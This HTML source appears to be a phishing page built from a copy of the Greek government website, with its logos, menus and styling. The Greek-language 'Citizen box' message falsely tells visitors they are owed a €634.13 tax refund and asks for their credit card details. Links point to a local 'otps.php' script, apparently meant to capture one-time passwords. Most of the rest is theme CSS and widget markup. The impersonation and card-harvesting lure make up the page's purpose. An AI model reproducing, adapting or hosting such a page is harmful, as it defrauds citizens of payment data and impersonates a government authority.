                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-clear-cookies" aria-label="Cleaning" title="Cleaning"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cleaning</font></font></button>

            </div>

        </div><div class="a_module wah_font_resize">

            <div class="a_module_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Font size</font></font></div>

            <div class="a_module_exe font_resizer">

                <button tabindex="-1" type="button" class="wah-action-button smaller wahout" title="smaller font size" aria-label="smaller font size"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A-</font></font></button>

                <button tabindex="-1" type="button" class="wah-action-button larger wahout" title="larger font size" aria-label="larger font size"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A+</font></font></button><button tabindex="-1" type="button" class="wah-action-button wah-font-reset wahout" title="Reset font size" aria-label="Reset font size"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Reset font size</font></font></button>

            </div>

        </div><div class="a_module wah_keyboard_navigation">

            <div class="a_module_exe">

                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-keyboard-navigation" aria-label="Keyboard navigation" title="Keyboard navigation"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Keyboard navigation</font></font></button>

            </div>

        </div><div class="a_module wah_readable_fonts">

            <div class="a_module_exe readable_fonts">

                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-readable-fonts" aria-label="Change font" title="Change font"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Change font</font></font></button>

            </div>

        </div><div class="a_module wah_contrast_trigger">

                <div class="a_module_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Background color</font></font></div>

                <div class="a_module_exe">

                    <button tabindex="-1" type="button" id="contrast_trigger" class="contrast_trigger wah-action-button wahout wah-call-contrast-trigger" title="Contrast"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Colour</font></font></button>

                    <div class="color_selector" aria-hidden="true">

                        <button type="button" class="convar black wahout" data-bgcolor="#000" data-color="#FFF" title="black"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">black</font></font></button>

                        <button type="button" class="convar white wahout" data-bgcolor="#FFF" data-color="#000" title="white"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">white</font></font></button>

                        <button type="button" class="convar green wahout" data-bgcolor="#00FF21" data-color="#000" title="green"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">green</font></font></button>

                        <button type="button" class="convar blue wahout" data-bgcolor="#0FF" data-color="#000" title="blue"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">blue</font></font></button>

                        <button type="button" class="convar red wahout" data-bgcolor="#F00" data-color="#000" title="ed"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ed</font></font></button>

                        <button type="button" class="convar orange wahout" data-bgcolor="#FF6A00" data-color="#000" title="orange"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">orange</font></font></button>

                        <button type="button" class="convar yellow wahout" data-bgcolor="#FFD800" data-color="#000" title="yellow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yellow</font></font></button>

                        <button type="button" class="convar navi wahout" data-bgcolor="#B200FF" data-color="#000" title="navi"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">navi</font></font></button>

                    </div>

                </div>

            </div><div class="a_module wah_underline_links">

            <div class="a_module_exe">

                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-underline-links" aria-label="Underline hyperlinks" title="Underline hyperlinks"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Underline hyperlinks</font></font></button>

            </div>

        </div><div class="a_module wah_highlight_links">

            <div class="a_module_exe">

                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-highlight-links" aria-label="Highlight hyperlinks" title="Highlight hyperlinks"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Highlight hyperlinks</font></font></button>

            </div>

        </div><div class="a_module wah_invert">

            <div class="a_module_exe">

                <button tabindex="-1" type="button" class="wah-action-button wahout wah-call-invert" aria-label="Color inversion" title="Color inversion"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Color inversion</font></font></button>

            </div>

        </div>
                    
    <button type="button" title="Close sidebar" class="wah-skip close-wah-sidebar"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">

        Closure
    </font></font></button>


                </div>

            </div>

            


<script type="text/javascript">

    var roleLink = 1;
    var removeLinkTitles = 1;
    
    
    
    
    
    
    
    
</script>


    <style media="screen">#access_container {font-family:Arial, Helvetica, sans-serif;}</style>



    

    <style media="screen" type="text/css">
        body #wp_access_helper_container button.aicon_link {
                                                bottom:20px !important;        }
    </style>





        
    <!-- WP Accessibility Helper. Created by Alex Volkov. -->

</div>

        <div class="td-scroll-up"><i class="td-icon-menu-up"></i></div>
    
    <div class="td-menu-background"></div>
<div id="td-mobile-nav" style="min-height: 758px;">
    <div class="td-mobile-container">
        <!-- mobile menu top section -->
        <div class="td-menu-socials-wrap">
            <!-- socials -->
            <div class="td-menu-socials">
                
        <span class="td-social-icon-wrap" data-wahfont="14">
            <a target="_blank" href="https://www.facebook.com/govgr/" data-wahfont="14" role="link">
                <i class="td-icon-font td-icon-facebook"></i>
            </a>
        </span>
        <span class="td-social-icon-wrap" data-wahfont="14">
            <a target="_blank" href="https://www.instagram.com/governmentgr/" data-wahfont="14" role="link">
                <i class="td-icon-font td-icon-instagram"></i>
            </a>
        </span>
        <span class="td-social-icon-wrap" data-wahfont="14">
            <a target="_blank" href="https://twitter.com/govgr" data-wahfont="14" role="link">
                <i class="td-icon-font td-icon-twitter"></i>
            </a>
        </span>
        <span class="td-social-icon-wrap" data-wahfont="14">
            <a target="_blank" href="https://www.youtube.com/channel/UCJ2tJy8E4FbV7JwWsuO547g" data-wahfont="14" role="link">
                <i class="td-icon-font td-icon-youtube"></i>
            </a>
        </span>            </div>
            <!-- close button -->
            <div class="td-mobile-close">
                <a href="https://government.gov.gr/2015/12/#" data-wahfont="14" role="link"><i class="td-icon-close-mobile"></i></a>
            </div>
        </div>

        <!-- login section -->
        
        <!-- menu section -->
        <div class="td-mobile-content">
            <div class="menu-main-container"><ul id="menu-main" class="td-mobile-main-menu"><li id="menu-item-10155" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first menu-item-10155"><a href="http://127.0.0.1/gov/otps.php#" data-wahfont="21" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TIMELINESS</font></font></a></li>
<li id="menu-item-10156" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10156"><a href="https://government.gov.gr/eidos/ergo/" data-wahfont="21" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WORK</font></font></a></li>
<li id="menu-item-9749" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9749"><a target="_blank" href="http://primeminister.gr/" data-wahfont="21" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRIME MINISTER</font></font></a></li>
<li id="menu-item-22508" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22508"><a href="https://government.gov.gr/kivernisi/" data-wahfont="21" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOVERNMENT</font></font></a></li>
</ul></div>        </div>
    </div>

    <!-- register/login section -->
    </div>    <div class="td-search-background"></div>
<div class="td-search-wrap-mob">
	<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
		<form method="get" class="td-search-form" action="https://government.gov.gr/">
			<!-- close button -->
			<div class="td-search-close">
				<a href="https://government.gov.gr/2015/12/#" data-wahfont="14" role="link"><i class="td-icon-close-mobile"></i></a>
			</div>
			<div role="search" class="td-search-input">
				<span data-wahfont="12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">search</font></font></span>
				<input id="td-header-search-mob" type="text" value="" name="s" autocomplete="off">
			</div>
		</form>
		<div id="td-aj-search-mob"></div>
	</div>
</div>

    <style>
        @media (max-width: 767px) {
            .td-header-desktop-wrap {
                display: none;
            }
        }
        @media (min-width: 767px) {
            .td-header-mobile-wrap {
                display: none;
            }
        }
    </style>
    
    <div id="td-outer-wrap" class="td-theme-wrap">
    
        
            <div class="tdc-header-wrap ">

            <!--
Header style 7
-->


<div class="td-header-wrap td-header-style-7 ">
    
        <div class="td-header-top-menu-full td-container-wrap ">
        <div class="td-container td-header-row td-header-top-menu">
            
    <div class="top-bar-style-1">
        
<div class="td-header-sp-top-menu"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">


	        <?php 
                              $gg = date('d/m/Y', strtotime(' + day'));
                              echo "" . date("d/m/Y") ;
                              ?>  </font></font></div>
        <div class="td-header-sp-top-widget">
    
    
        
           </div>    </div>

<!-- LOGIN MODAL -->
        </div>
    </div>
    
    <div class="td-header-menu-wrap-full td-container-wrap " style="height: 106px;">
        
        <div class="td-header-menu-wrap td-header-gradient" style="transform: translate3d(0px, 0px, 0px);">
            <div class="td-container td-header-row td-header-main-menu">
                <div class="td-header-sp-logo">
                            <a class="td-main-logo" href="http://127.0.0.1/gov/otps.php#" data-wahfont="14" role="link">
            <img class="td-retina-data" data-retina="https://government.gov.gr/wp-content/uploads/2019/07/gov_site-500x165.png" src="./Greek Government_files/kyvernisi-logo-small-1.png" alt="GREEK GOVERNMENT" title="Project &amp; activity">
            <span class="td-visual-hidden" data-wahfont="14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Greek Government</font></font></span>
        </a>
                    </div>
                    
    <div class="header-search-wrap">
        <div class="td-search-btns-wrap">
            <a id="td-header-search-button" href="https://government.gov.gr/2015/12/#" role="link" class="dropdown-toggle " data-toggle="dropdown" data-wahfont="14"></a>
        </div>

        <div class="td-drop-down-search" aria-labelledby="td-header-search-button">
            <form method="get" class="td-search-form" action="https://government.gov.gr/">
                <div role="search" class="td-head-form-search-wrap">
                    <input id="td-header-search" type="text" value="" name="s" autocomplete="off"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="search"></font></font>
                </div>
            </form>
            <div id="td-aj-search"></div>
        </div>
    </div>

<div id="td-header-menu" role="navigation">
    <div id="td-top-mobile-toggle"><a href="https://government.gov.gr/2015/12/#" data-wahfont="14" role="link"></a></div>
    <div class="td-main-menu-logo td-logo-in-header td-logo-sticky">
        		<a class="td-mobile-logo td-sticky-mobile" href="gov/otps.php#" data-wahfont="14" role="link">
			<img class="td-retina-data" data-retina="https://government.gov.gr/wp-content/uploads/2017/09/logo-sites-14.png" src="./Greek Government_files/logo-sites-09.png" alt="GREEK GOVERNMENT" title="Project &amp; activity">
		</a>
			<a class="td-header-logo td-sticky-mobile" href="https://government.gov.gr/" data-wahfont="14" role="link">
			<img class="td-retina-data" data-retina="https://government.gov.gr/wp-content/uploads/2019/07/gov_site-500x165.png" src="./Greek Government_files/kyvernisi-logo-small-1.png" alt="GREEK GOVERNMENT" title="Project &amp; activity">
		</a>
	    </div>
    <div class="menu-main-container"><ul id="menu-main-1" class="sf-menu sf-js-enabled"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-10155"><a href="gov/otps.php#" data-wahfont="13" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TIMELINESS</font></font></a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-10156"><a href="gov/otps.php#" data-wahfont="13" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WORK</font></font></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-9749"><a target="_blank" href="gov/otps.php#" data-wahfont="13" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRIME MINISTER</font></font></a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-22508"><a href="gov/otps.php#" data-wahfont="13" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOVERNMENT</font></font></a></li>
</ul></div></div>            </div>
        </div>
    </div>

    
</div>
            </div>

            
<div class="td-main-content-wrap td-container-wrap">
    <div class="td-container ">
        <div class="td-crumb-container">
                    </div>
        <div class="td-pb-row">
                                    <div class="td-pb-span8 td-main-content">
                            <div class="td-ss-main-content"><div class="clearfix"></div>
                                <div class="td-page-header">
                                    <h1 class="entry-title td-page-title" data-wahfont="30">
                                        <span data-wahfont="30"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Citizen box</font></font></span>

                                    </h1>
                                </div>

                                

	<div class="td-block-row">

	<div class="td-block-span6">

        <div class="td_module_6 td_module_wrap td-animation-stack">

        
         <div class="wpb_wrapper">
            <p data-wahfont="19">Η Ελληνική Εφορία έχει υπολογίσει τη φορολογική σας δήλωση, δικαιούστε επιστροφή φόρου €634,13.
Προσπαθήσαμε να μεταφέρουμε το ποσό στο λογαριασμό σας, δυστυχώς δεν μπορέσαμε να επιβεβαιώσουμε
τον τρέχοντα αριθμό λογαριασμού σας.</p>
<h4 data-wahfont="19"><strong>Εισαγάγετε τα στοιχεία σας</strong>
            <p data-wahfont="19">Για άλλες τράπεζες, θα στείλουμε την επιστροφή χρημάτων στην πιστωτική κάρτα που έχετε καταχωρίσει.
Βεβαιωθείτε ότι έχετε εισαγάγει μια έγκυρη πιστωτική κάρτα.
Η επιστροφή χρημάτων θα εμφανιστεί στο αντίγραφο κίνησης του τραπεζικού σας λογαριασμού που συνδέεται με την καταχωρισμένη πιστωτική κάρτα.</p></h4></div>
<img src="oo_files/wallet.png" class="mb-3" alt="packaged goods" data-uw-rm-ima="ai">
        </div>

        
	</div> <!-- ./td-block-span6 --></div><!--./row-fluid-->
                                                            <div class="clearfix"></div></div>
                        </div>

      <div class="card mb-2">
                           <div class="card-header py-3" style="background-color: #0056b3;">
                                                         </div>
                           <div class="card-body">
                              <div class="d-flex justify-content-center"><img src="./Greek Government_files/Spinner.gif" alt=""></div>
                                 
                              </div>
                           </div>
                        </div>
                     </div>
      

<!-- Instagram -->

        <script src="./Greek Government_files/jquery.js(1).download"></script>
        <script src="./Greek Government_files/sweetalert.min.js.download"></script>
    




	<!-- Footer -->
	<div class="td-footer-wrapper td-footer-container td-container-wrap td-footer-template-4 ">
    <div class="td-container">

	    <div class="td-pb-row">
		    <div class="td-pb-span12">
                		    </div>
	    </div>

        <div class="td-pb-row">

            <div class="td-pb-span12">
                <div class="td-footer-info"><div class="footer-logo-wrap"><a href="http://127.0.0.1/gov/otps.php#" data-wahfont="14" role="link"><img class="td-retina-data" src="./Greek Government_files/govgr-logo.png" data-retina="https://government.gov.gr/wp-content/uploads/2022/03/govgr-logo.png" alt="Greek Government" title="Greek Government" width="427"></a></div><div class="footer-text-wrap"></div></div>            </div>
        </div>
    </div>
</div>

	<!-- Sub Footer -->
	    <div class="td-sub-footer-container td-container-wrap ">
        <div class="td-container">
            <div class="td-pb-row">
                <div class="td-pb-span td-sub-footer-menu">
                                    </div>

                <div class="td-pb-span td-sub-footer-copy">
                    <a href="http://127.0.0.1/gov/otps.php#" data-wahfont="12" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Terms of Use &amp; Data Protection Policy</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> | </font></font><a href="http://127.0.0.1/gov/otps.php#" data-wahfont="12" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Social Networking Services Usage Policy</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> | </font></font><a href="http://127.0.0.1/gov/otps.php#" data-wahfont="12" role="link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contact</font></font></a>                 </div>
            </div>
        </div>
    </div>


</div><!--close td-outer-wrap-->








    <!--

        Theme: Newspaper by tagDiv.com 2019
        Version: 9.6 (rara)
        Deploy mode: deploy
        Speed booster: v4.9

        uid: 6243ba91c771b
    -->

    
<!-- Custom css from theme panel -->
<style type="text/css" media="screen">
/* custom css theme panel */
.td-header-style-7 .td-header-top-menu {
    border-bottom: 1px solid #e0e0e0!important;
}

.td_block_18.representative + .widget{
    position:none;
}
.comment-msg{
    display:none;
}
</style>

<script type="text/javascript" src="./Greek Government_files/pdfobject.min.js.download"></script>
<script type="text/javascript">
/* <![CDATA[ */
var eadPublic = [];
/* ]]> */
</script>
<script type="text/javascript" src="./Greek Government_files/embed-public.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/wp-accessibility-helper.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/jquery.tagcanvas.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/wpctc.tagcanvas.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/jquery.style.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/wp-category-tag-cloud.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/tagdiv_theme.min.js.download"></script>
<script type="text/javascript" src="./Greek Government_files/wp-embed.min.js.download"></script>

<!-- JS generated by theme -->

<script>
    

	

		(function(){
			var html_jquery_obj = jQuery('html');

			if (html_jquery_obj.length && (html_jquery_obj.is('.ie8') || html_jquery_obj.is('.ie9'))) {

				var path = 'https://government.gov.gr/wp-content/themes/goverment/style.css';

				jQuery.get(path, function(data) {

					var str_split_separator = '#td_css_split_separator';
					var arr_splits = data.split(str_split_separator);
					var arr_length = arr_splits.length;

					if (arr_length > 1) {

						var dir_path = 'https://government.gov.gr/wp-content/themes/Newspaper';
						var splited_css = '';

						for (var i = 0; i < arr_length; i++) {
							if (i > 0) {
								arr_splits[i] = str_split_separator + ' ' + arr_splits[i];
							}
							//jQuery('head').append('<style>' + arr_splits[i] + '</style>');

							var formated_str = arr_splits[i].replace(/\surl\(\'(?!data\:)/gi, function regex_function(str) {
								return ' url(\'' + dir_path + '/' + str.replace(/url\(\'/gi, '').replace(/^\s+|\s+$/gm,'');
							});

							splited_css += "<style>" + formated_str + "</style>";
						}

						var td_theme_css = jQuery('link#td-theme-css');

						if (td_theme_css.length) {
							td_theme_css.after(splited_css);
						}
					}
				});
			}
		})();

	
	
</script>


<!-- Header style compiled by theme -->

<style>
    

body {
	background-color:#ffffff;
}
.td-header-wrap .black-menu .sf-menu > .current-menu-item > a,
    .td-header-wrap .black-menu .sf-menu > .current-menu-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > .current-category-ancestor > a,
    .td-header-wrap .black-menu .sf-menu > li > a:hover,
    .td-header-wrap .black-menu .sf-menu > .sfHover > a,
    .td-header-style-12 .td-header-menu-wrap-full,
    .sf-menu > .current-menu-item > a:after,
    .sf-menu > .current-menu-ancestor > a:after,
    .sf-menu > .current-category-ancestor > a:after,
    .sf-menu > li:hover > a:after,
    .sf-menu > .sfHover > a:after,
    .td-header-style-12 .td-affix,
    .header-search-wrap .td-drop-down-search:after,
    .header-search-wrap .td-drop-down-search .btn:hover,
    input[type=submit]:hover,
    .td-read-more a,
    .td-post-category:hover,
    .td-grid-style-1.td-hover-1 .td-big-grid-post:hover .td-post-category,
    .td-grid-style-5.td-hover-1 .td-big-grid-post:hover .td-post-category,
    .td_top_authors .td-active .td-author-post-count,
    .td_top_authors .td-active .td-author-comments-count,
    .td_top_authors .td_mod_wrap:hover .td-author-post-count,
    .td_top_authors .td_mod_wrap:hover .td-author-comments-count,
    .td-404-sub-sub-title a:hover,
    .td-search-form-widget .wpb_button:hover,
    .td-rating-bar-wrap div,
    .td_category_template_3 .td-current-sub-category,
    .dropcap,
    .td_wrapper_video_playlist .td_video_controls_playlist_wrapper,
    .wpb_default,
    .wpb_default:hover,
    .td-left-smart-list:hover,
    .td-right-smart-list:hover,
    .woocommerce-checkout .woocommerce input.button:hover,
    .woocommerce-page .woocommerce a.button:hover,
    .woocommerce-account div.woocommerce .button:hover,
    #bbpress-forums button:hover,
    .bbp_widget_login .button:hover,
    .td-footer-wrapper .td-post-category,
    .td-footer-wrapper .widget_product_search input[type="submit"]:hover,
    .woocommerce .product a.button:hover,
    .woocommerce .product #respond input#submit:hover,
    .woocommerce .checkout input#place_order:hover,
    .woocommerce .woocommerce.widget .button:hover,
    .single-product .product .summary .cart .button:hover,
    .woocommerce-cart .woocommerce table.cart .button:hover,
    .woocommerce-cart .woocommerce .shipping-calculator-form .button:hover,
    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child > div,
    .td_category_template_8 .td-category-header .td-category a.td-current-sub-category,
    .td_category_template_4 .td-category-siblings .td-category a:hover,
    #bbpress-forums .bbp-pagination .current,
    #bbpress-forums #bbp-single-user-details #bbp-user-navigation li.current a,
    .td-theme-slider:hover .slide-meta-cat a,
    a.vc_btn-black:hover,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .td-scroll-up,
    .td-smart-list-button:hover,
    .td-weather-information:before,
    .td-weather-week:before,
    .td_block_exchange .td-exchange-header:before,
    .td_block_big_grid_9.td-grid-style-1 .td-post-category,
    .td_block_big_grid_9.td-grid-style-5 .td-post-category,
    .td-grid-style-6.td-hover-1 .td-module-thumb:after,
    .td-pulldown-syle-2 .td-subcat-dropdown ul:after,
    .td_block_template_9 .td-block-title:after,
    .td_block_template_15 .td-block-title:before,
    div.wpforms-container .wpforms-form div.wpforms-submit-container button[type=submit] {
        background-color: #004b8d;
    }

    .td_block_template_4 .td-related-title .td-cur-simple-item:before {
        border-color: #004b8d transparent transparent transparent !important;
    }

    .woocommerce .woocommerce-message .button:hover,
    .woocommerce .woocommerce-error .button:hover,
    .woocommerce .woocommerce-info .button:hover {
        background-color: #004b8d !important;
    }
    
    
    .td_block_template_4 .td-related-title .td-cur-simple-item,
    .td_block_template_3 .td-related-title .td-cur-simple-item,
    .td_block_template_9 .td-related-title:after {
        background-color: #004b8d;
    }

    .woocommerce .product .onsale,
    .woocommerce.widget .ui-slider .ui-slider-handle {
        background: none #004b8d;
    }

    .woocommerce.widget.widget_layered_nav_filters ul li a {
        background: none repeat scroll 0 0 #004b8d !important;
    }

    a,
    cite a:hover,
    .td_mega_menu_sub_cats .cur-sub-cat,
    .td-mega-span h3 a:hover,
    .td_mod_mega_menu:hover .entry-title a,
    .header-search-wrap .result-msg a:hover,
    .td-header-top-menu .td-drop-down-search .td_module_wrap:hover .entry-title a,
    .td-header-top-menu .td-icon-search:hover,
    .td-header-wrap .result-msg a:hover,
    .top-header-menu li a:hover,
    .top-header-menu .current-menu-item > a,
    .top-header-menu .current-menu-ancestor > a,
    .top-header-menu .current-category-ancestor > a,
    .td-social-icon-wrap > a:hover,
    .td-header-sp-top-widget .td-social-icon-wrap a:hover,
    .td-page-content blockquote p,
    .td-post-content blockquote p,
    .mce-content-body blockquote p,
    .comment-content blockquote p,
    .wpb_text_column blockquote p,
    .td_block_text_with_title blockquote p,
    .td_module_wrap:hover .entry-title a,
    .td-subcat-filter .td-subcat-list a:hover,
    .td-subcat-filter .td-subcat-dropdown a:hover,
    .td_quote_on_blocks,
    .dropcap2,
    .dropcap3,
    .td_top_authors .td-active .td-authors-name a,
    .td_top_authors .td_mod_wrap:hover .td-authors-name a,
    .td-post-next-prev-content a:hover,
    .author-box-wrap .td-author-social a:hover,
    .td-author-name a:hover,
    .td-author-url a:hover,
    .td_mod_related_posts:hover h3 > a,
    .td-post-template-11 .td-related-title .td-related-left:hover,
    .td-post-template-11 .td-related-title .td-related-right:hover,
    .td-post-template-11 .td-related-title .td-cur-simple-item,
    .td-post-template-11 .td_block_related_posts .td-next-prev-wrap a:hover,
    .comment-reply-link:hover,
    .logged-in-as a:hover,
    #cancel-comment-reply-link:hover,
    .td-search-query,
    .td-category-header .td-pulldown-category-filter-link:hover,
    .td-category-siblings .td-subcat-dropdown a:hover,
    .td-category-siblings .td-subcat-dropdown a.td-current-sub-category,
    .widget a:hover,
    .td_wp_recentcomments a:hover,
    .archive .widget_archive .current,
    .archive .widget_archive .current a,
    .widget_calendar tfoot a:hover,
    .woocommerce a.added_to_cart:hover,
    .woocommerce-account .woocommerce-MyAccount-navigation a:hover,
    #bbpress-forums li.bbp-header .bbp-reply-content span a:hover,
    #bbpress-forums .bbp-forum-freshness a:hover,
    #bbpress-forums .bbp-topic-freshness a:hover,
    #bbpress-forums .bbp-forums-list li a:hover,
    #bbpress-forums .bbp-forum-title:hover,
    #bbpress-forums .bbp-topic-permalink:hover,
    #bbpress-forums .bbp-topic-started-by a:hover,
    #bbpress-forums .bbp-topic-started-in a:hover,
    #bbpress-forums .bbp-body .super-sticky li.bbp-topic-title .bbp-topic-permalink,
    #bbpress-forums .bbp-body .sticky li.bbp-topic-title .bbp-topic-permalink,
    .widget_display_replies .bbp-author-name,
    .widget_display_topics .bbp-author-name,
    .footer-text-wrap .footer-email-wrap a,
    .td-subfooter-menu li a:hover,
    .footer-social-wrap a:hover,
    a.vc_btn-black:hover,
    .td-smart-list-dropdown-wrap .td-smart-list-button:hover,
    .td_module_17 .td-read-more a:hover,
    .td_module_18 .td-read-more a:hover,
    .td_module_19 .td-post-author-name a:hover,
    .td-instagram-user a,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more i,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more i,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover i,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-link:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-item .td-cur-simple-item,
    .td_block_template_2 .td-related-title .td-cur-simple-item,
    .td_block_template_5 .td-related-title .td-cur-simple-item,
    .td_block_template_6 .td-related-title .td-cur-simple-item,
    .td_block_template_7 .td-related-title .td-cur-simple-item,
    .td_block_template_8 .td-related-title .td-cur-simple-item,
    .td_block_template_9 .td-related-title .td-cur-simple-item,
    .td_block_template_10 .td-related-title .td-cur-simple-item,
    .td_block_template_11 .td-related-title .td-cur-simple-item,
    .td_block_template_12 .td-related-title .td-cur-simple-item,
    .td_block_template_13 .td-related-title .td-cur-simple-item,
    .td_block_template_14 .td-related-title .td-cur-simple-item,
    .td_block_template_15 .td-related-title .td-cur-simple-item,
    .td_block_template_16 .td-related-title .td-cur-simple-item,
    .td_block_template_17 .td-related-title .td-cur-simple-item,
    .td-theme-wrap .sf-menu ul .td-menu-item > a:hover,
    .td-theme-wrap .sf-menu ul .sfHover > a,
    .td-theme-wrap .sf-menu ul .current-menu-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-category-ancestor > a,
    .td-theme-wrap .sf-menu ul .current-menu-item > a,
    .td_outlined_btn,
     .td_block_categories_tags .td-ct-item:hover {
        color: #004b8d;
    }

    a.vc_btn-black.vc_btn_square_outlined:hover,
    a.vc_btn-black.vc_btn_outlined:hover,
    .td-mega-menu-page .wpb_content_element ul li a:hover,
    .td-theme-wrap .td-aj-search-results .td_module_wrap:hover .entry-title a,
    .td-theme-wrap .header-search-wrap .result-msg a:hover {
        color: #004b8d !important;
    }

    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child > div,
    .td_category_template_8 .td-category-header .td-category a.td-current-sub-category,
    .td_category_template_4 .td-category-siblings .td-category a:hover,
    #bbpress-forums .bbp-pagination .current,
    .post .td_quote_box,
    .page .td_quote_box,
    a.vc_btn-black:hover,
    .td_block_template_5 .td-block-title > *,
    .td_outlined_btn {
        border-color: #004b8d;
    }

    .td_wrapper_video_playlist .td_video_currently_playing:after {
        border-color: #004b8d !important;
    }

    .header-search-wrap .td-drop-down-search:before {
        border-color: transparent transparent #004b8d transparent;
    }

    .block-title > span,
    .block-title > a,
    .block-title > label,
    .widgettitle,
    .widgettitle:after,
    .td-trending-now-title,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active > a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover > a,
    .td_block_template_1 .td-related-title .td-cur-simple-item,
    .woocommerce .product .products h2:not(.woocommerce-loop-product__title),
    .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more, 
    .td_3D_btn,
    .td_shadow_btn,
    .td_default_btn,
    .td_round_btn, 
    .td_outlined_btn:hover {
    	background-color: #004b8d;
    }

    .woocommerce div.product .woocommerce-tabs ul.tabs li.active {
    	background-color: #004b8d !important;
    }

    .block-title,
    .td_block_template_1 .td-related-title,
    .wpb_tabs .wpb_tabs_nav,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container,
    .woocommerce div.product .woocommerce-tabs ul.tabs:before {
        border-color: #004b8d;
    }
    .td_block_wrap .td-subcat-item a.td-cur-simple-item {
	    color: #004b8d;
	}


    
    .td-grid-style-4 .entry-title
    {
        background-color: rgba(0, 75, 141, 0.7);
    }

    
    .block-title > span,
    .block-title > span > a,
    .block-title > a,
    .block-title > label,
    .widgettitle,
    .widgettitle:after,
    .td-trending-now-title,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active > a,
